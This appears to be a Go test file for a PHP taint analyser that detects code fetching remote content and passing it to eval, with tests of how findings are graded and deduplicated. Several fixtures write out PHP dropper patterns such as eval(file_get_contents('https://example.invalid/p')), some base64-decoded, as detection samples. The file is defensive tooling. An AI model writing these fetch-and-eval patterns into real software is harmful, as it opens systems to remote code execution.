package phptaint

import (
	"context"
	"testing"
	"unsafe"
)

func TestBasisValid(t *testing.T) {
	for _, b := range []Basis{BasisAlwaysRemote, BasisLiteral, BasisDecoded, BasisRequest, BasisCallArgument, BasisUnresolved} {
		if !b.Valid() {
			t.Errorf("%q: want valid", b)
		}
	}
	for _, b := range []Basis{"", "Literal", "remote", "unresolved "} {
		if b.Valid() {
			t.Errorf("%q: want invalid", b)
		}
	}
}

// The order is the spec's: confidence first, then basis priority, then the
// lowest resolution offset. Each row pins one rule so ablating any one of
// them fails a named case.
func TestGradeStronger(t *testing.T) {
	for _, tc := range []struct {
		name string
		a, b grade
		want bool
	}{
		{"confidence wins over basis", grade{ConfidenceHigh, BasisUnresolved, -1}, grade{ConfidenceLow, BasisAlwaysRemote, -1}, true},
		{"lower confidence loses", grade{ConfidenceLow, BasisAlwaysRemote, -1}, grade{ConfidenceHigh, BasisUnresolved, -1}, false},
		{"basis priority on tie", grade{ConfidenceHigh, BasisLiteral, -1}, grade{ConfidenceHigh, BasisDecoded, -1}, true},
		{"always-remote beats literal", grade{ConfidenceHigh, BasisAlwaysRemote, -1}, grade{ConfidenceHigh, BasisLiteral, -1}, true},
		{"request beats call-argument", grade{ConfidenceHigh, BasisRequest, -1}, grade{ConfidenceHigh, BasisCallArgument, -1}, true},
		{"call-argument beats unresolved", grade{ConfidenceHigh, BasisCallArgument, 5}, grade{ConfidenceHigh, BasisUnresolved, -1}, true},
		{"lower offset on full tie", grade{ConfidenceHigh, BasisCallArgument, 3}, grade{ConfidenceHigh, BasisCallArgument, 9}, true},
		{"direct offset -1 is lowest", grade{ConfidenceHigh, BasisCallArgument, -1}, grade{ConfidenceHigh, BasisCallArgument, 0}, true},
		{"equal is not stronger", grade{ConfidenceHigh, BasisLiteral, -1}, grade{ConfidenceHigh, BasisLiteral, -1}, false},
	} {
		if got := tc.a.stronger(tc.b); got != tc.want {
			t.Errorf("%s: stronger = %v, want %v", tc.name, got, tc.want)
		}
	}
}

func onlyResult(t *testing.T, src []byte) Result {
	t.Helper()
	r := Analyze(context.Background(), src)
	if r.Status != StatusAnalyzed || len(r.Results) != 1 || r.TotalResults != 1 {
		t.Fatalf("report = %+v, want exactly one analyzed result", r)
	}
	return r.Results[0]
}

func TestResultBasisForExistingGrades(t *testing.T) {
	for _, tc := range []struct {
		name  string
		src   string // PHP, stored here as plain text: none of these is a working dropper URL (example.invalid)
		conf  Confidence
		basis Basis
	}{
		{"always-remote", `<?php $c = curl_init('x'); eval(curl_exec($c));`, ConfidenceHigh, BasisAlwaysRemote},
		{"literal", `<?php eval(file_get_contents('https://example.invalid/p'));`, ConfidenceHigh, BasisLiteral},
		{"unresolved", `<?php eval(file_get_contents($u));`, ConfidenceLow, BasisUnresolved},
		{"certain keeps source basis", `<?php eval(base64_decode(file_get_contents('https://example.invalid/p')));`, ConfidenceCertain, BasisLiteral},
		{"certain unresolved keeps unresolved", `<?php eval(base64_decode(file_get_contents($u)));`, ConfidenceCertain, BasisUnresolved},
		{"through variable", `<?php $d = file_get_contents('https://example.invalid/p'); eval($d);`, ConfidenceHigh, BasisLiteral},
		{"through summary", `<?php function f() { return file_get_contents('https://example.invalid/p'); } eval(f());`, ConfidenceHigh, BasisLiteral},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != tc.conf || got.Basis != tc.basis || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want confidence %v basis %q offset -1", got, tc.conf, tc.basis)
			}
		})
	}
}

// Deduplication keeps the stronger flow's own explanation: a Low unresolved
// flow and a High literal flow that render the same endpoint pair must
// report High with the literal basis, never High with "unresolved".
func TestDedupeKeepsStrongerBasis(t *testing.T) {
	src := `<?php
eval(file_get_contents($u));
eval(file_get_contents('https://example.invalid/p'));`
	got := onlyResult(t, []byte(src))
	if got.Confidence != ConfidenceHigh || got.Basis != BasisLiteral {
		t.Fatalf("result = %+v, want High literal", got)
	}
}

func TestFinalizeKeepsBasis(t *testing.T) {
	r := finalizeReport(Report{Status: StatusAnalyzed, TotalResults: 1,
		Results: []Result{{Source: "s", Sink: "eval", Confidence: ConfidenceLow, Basis: BasisUnresolved, ResolutionOffset: -1}}})
	if r.Results[0].Basis != BasisUnresolved || r.Results[0].ResolutionOffset != -1 {
		t.Fatalf("finalize altered evidence: %+v", r.Results[0])
	}
}

// The solver joins every active origin of a variable by grade, so the
// weaker proof seen first never hides a stronger one seen later.
func TestSolverJoinKeepsStrongerGrade(t *testing.T) {
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"two assignments", `<?php
$d = file_get_contents($u);
$d = file_get_contents('https://example.invalid/p');
eval($d);`},
		// Both origins feed one assignment; the weaker one comes first in
		// source order, which is the order the solver visits them.
		{"one assignment two origins", `<?php
$d = file_get_contents($u) . file_get_contents('https://example.invalid/p');
eval($d);`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != ConfidenceHigh || got.Basis != BasisLiteral || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want High literal offset -1", got)
			}
		})
	}
}

// The Certain upgrade must not make the reported basis depend on the order
// the solver happens to visit values. Both statement orders below hold the
// same facts: $a carries a High always-remote value and a Certain literal
// value, and $b decodes $a, so both become Certain and the spec's priority
// picks always-remote.
func TestBasisIndependentOfStatementOrder(t *testing.T) {
	const (
		plain   = `$a = curl_exec($c);`
		decoded = `$a = base64_decode(file_get_contents('https://example.invalid/p'));`
		use     = `$b = base64_decode($a);`
		sink    = `eval($b);`
	)
	orders := []string{
		"<?php " + plain + " " + use + " " + decoded + " " + sink,
		"<?php " + decoded + " " + use + " " + plain + " " + sink,
	}
	var want string
	for i, src := range orders {
		got := onlyResult(t, []byte(src))
		if got.Confidence != ConfidenceCertain || got.Basis != BasisAlwaysRemote || got.ResolutionOffset != -1 {
			t.Errorf("order %d: result = %+v, want Certain always-remote offset -1", i, got)
		}
		fp := reportFingerprint(Analyze(context.Background(), []byte(src)))
		if i == 0 {
			want = fp
		} else if fp != want {
			t.Errorf("statement order changed the report:\n first: %s\n this:  %s", want, fp)
		}
	}
}

// Same property across summaries: the fixpoint over bodies must reach one
// answer whatever order the functions are declared in.
func TestBasisIndependentOfDeclarationOrder(t *testing.T) {
	decls := []string{
		"function g(){ return base64_decode(f()); }\n",
		"function f(){ return curl_exec($c) . h(); }\n",
		"function h(){ return base64_decode(file_get_contents('https://example.invalid/p')); }\n",
	}
	var want string
	for i, order := range permutations(decls) {
		src := "<?php\n"
		for _, d := range order {
			src += d
		}
		src += "eval(g());\n"
		got := onlyResult(t, []byte(src))
		if got.Confidence != ConfidenceCertain || got.Basis != BasisAlwaysRemote {
			t.Errorf("order %v: result = %+v, want Certain always-remote", order, got)
		}
		fp := reportFingerprint(Analyze(context.Background(), []byte(src)))
		if i == 0 {
			want = fp
		} else if fp != want {
			t.Errorf("declaration order changed the report:\n first: %s\n this:  %s\n source:\n%s", want, fp, src)
		}
	}
}

// The upgrade on the assignment path keeps the acquiring call's basis, the
// same rule the sink path follows.
func TestSolverDecodeKeepsSourceBasis(t *testing.T) {
	got := onlyResult(t, []byte(`<?php $b = base64_decode(file_get_contents('https://example.invalid/p')); eval($b);`))
	if got.Confidence != ConfidenceCertain || got.Basis != BasisLiteral || got.ResolutionOffset != -1 {
		t.Fatalf("result = %+v, want Certain literal offset -1", got)
	}
}

// The join is pointwise per (basis, confidence) key, keeping the lowest
// offset. add reports growth only when a key appears or its offset drops,
// which is what lets every fixpoint over gradeSet stop.
func TestGradeSetJoin(t *testing.T) {
	var s gradeSet
	if !s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 9})) {
		t.Fatal("first proof: want growth")
	}
	if s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 9})) {
		t.Error("equal proof: want no growth")
	}
	if !s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 3})) {
		t.Error("lower offset on the same key: want growth")
	}
	if s.add(setOf(grade{ConfidenceHigh, BasisCallArgument, 5})) {
		t.Error("higher offset on the same key: want no growth")
	}
	if !s.add(setOf(grade{ConfidenceLow, BasisCallArgument, 1})) {
		t.Error("lower confidence on the same basis: want growth, it is a new key")
	}
	if !s.add(setOf(grade{ConfidenceLow, BasisUnresolved, -1})) {
		t.Error("new basis: want growth")
	}
	if got := s.strongest(); got != (grade{ConfidenceHigh, BasisCallArgument, 3}) {
		t.Errorf("strongest = %+v, want High call-argument offset 3", got)
	}
	// The upgrade moves every proof to Certain and joins each basis there,
	// so the Low call-argument proof's offset 1 now wins.
	var want gradeSet
	want.add(setOf(grade{ConfidenceCertain, BasisCallArgument, 1}))
	want.add(setOf(grade{ConfidenceCertain, BasisUnresolved, -1}))
	if got := s.decoded(); got != want {
		t.Errorf("decoded = %+v, want %+v", got, want)
	}
	if !(gradeSet{}).isEmpty() || s.isEmpty() {
		t.Error("isEmpty disagrees with contents")
	}
}

// The upgrade must distribute over the join: decoding a value before or
// after it meets another must give the same set. Offsets are -1 in analyzer
// output today, so this is pinned on gradeSet directly.
func TestGradeSetUpgradeCommutesWithJoin(t *testing.T) {
	high := setOf(grade{ConfidenceHigh, BasisLiteral, 3})
	certain := setOf(grade{ConfidenceCertain, BasisLiteral, 9})

	joinedFirst := high
	joinedFirst.add(certain)
	joinedFirst = joinedFirst.decoded()

	decodedFirst := high.decoded()
	decodedFirst.add(certain)

	want := grade{ConfidenceCertain, BasisLiteral, 3}
	if got := joinedFirst.strongest(); got != want {
		t.Errorf("join then upgrade: strongest = %+v, want %+v", got, want)
	}
	if got := decodedFirst.strongest(); got != want {
		t.Errorf("upgrade then join: strongest = %+v, want %+v", got, want)
	}
	if joinedFirst != decodedFirst {
		t.Errorf("sets differ:\n join then upgrade: %+v\n upgrade then join: %+v", joinedFirst, decodedFirst)
	}
}

// Property form of the same rule: for every insertion order and every point
// at which the upgrade is applied (to what has been joined so far, with each
// later value upgraded on its own), the result equals upgrading the whole
// join. This is the shape a worklist produces when a decoded value is seen
// before or after its inputs settle.
func TestGradeSetUpgradeIndependentOfOrder(t *testing.T) {
	proofs := []grade{
		{ConfidenceHigh, BasisLiteral, 3},
		{ConfidenceCertain, BasisLiteral, 9},
		{ConfidenceLow, BasisLiteral, 1},
		{ConfidenceHigh, BasisAlwaysRemote, 5},
		{ConfidenceLow, BasisUnresolved, -1},
	}
	var all gradeSet
	for _, p := range proofs {
		all.add(setOf(p))
	}
	want := all.decoded()

	idx := make([]string, len(proofs))
	for i := range proofs {
		idx[i] = string(rune('0' + i))
	}
	for _, order := range permutations(idx) {
		for split := 0; split <= len(order); split++ {
			var got gradeSet
			for _, k := range order[:split] {
				got.add(setOf(proofs[k[0]-'0']))
			}
			got = got.decoded()
			for _, k := range order[split:] {
				got.add(setOf(proofs[k[0]-'0']).decoded())
			}
			if got != want {
				t.Fatalf("order %v upgraded after %d: got %+v, want %+v", order, split, got, want)
			}
		}
	}
}

// The solver stores one gradeSet per variable, assignment output and
// summary, and one taintOrigin per read, so these sizes multiply with input
// an attacker writes. An origin must not carry a gradeSet by value, and an
// entry stays one int32 rather than a padded (bool, int) pair.
func TestSolverValueFootprint(t *testing.T) {
	if got := unsafe.Sizeof(gradeEntry(0)); got != 4 {
		t.Errorf("gradeEntry is %d bytes, want 4", got)
	}
	if got, want := unsafe.Sizeof(gradeSet{}), uintptr(len(rankedBases)*confidenceLevels*4); got != want {
		t.Errorf("gradeSet is %d bytes, want %d", got, want)
	}
	if got := unsafe.Sizeof(taintOrigin{}); got > 32 {
		t.Errorf("taintOrigin is %d bytes, want at most 32: keep fixed values out of line", got)
	}
}

// The biased encoding keeps the zero value absent and preserves offset order.
func TestGradeEntryEncoding(t *testing.T) {
	var zero gradeEntry
	if zero.present() {
		t.Error("zero entry: want absent")
	}
	for _, off := range []int{-1, 0, 1, MaxSourceBytes} {
		e := entryAt(off)
		if !e.present() || e.offset() != off {
			t.Errorf("entryAt(%d) = present %v offset %d", off, e.present(), e.offset())
		}
	}
	if entryAt(-1) >= entryAt(0) || entryAt(3) >= entryAt(9) {
		t.Error("encoding must preserve offset order")
	}
	for _, off := range []int{-2, MaxSourceBytes + 1} {
		func() {
			defer func() {
				if recover() == nil {
					t.Errorf("entryAt(%d): want panic", off)
				}
			}()
			entryAt(off)
		}()
	}
}

// The decoder upgrade belongs to the origins inside the decoder's input, not
// to the whole expression. Here the only Certain proof is the decoded
// unresolved read; the always-remote fetch beside it stays High, so the
// strongest proof is Certain unresolved. Upgrading the joined set would
// wrongly credit Certain to always-remote.
func TestDecodeUpgradesOnlyDecodedOrigins(t *testing.T) {
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"sink", `<?php eval(base64_decode(file_get_contents($x)) . curl_exec($c));`},
		{"assignment", `<?php $a = base64_decode(file_get_contents($x)) . curl_exec($c); eval($a);`},
		{"assignment through read", `<?php $r = curl_exec($c); $a = base64_decode(file_get_contents($x)) . $r; eval($a);`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			got := onlyResult(t, []byte(tc.src))
			if got.Confidence != ConfidenceCertain || got.Basis != BasisUnresolved || got.ResolutionOffset != -1 {
				t.Fatalf("result = %+v, want Certain unresolved offset -1", got)
			}
		})
	}
}
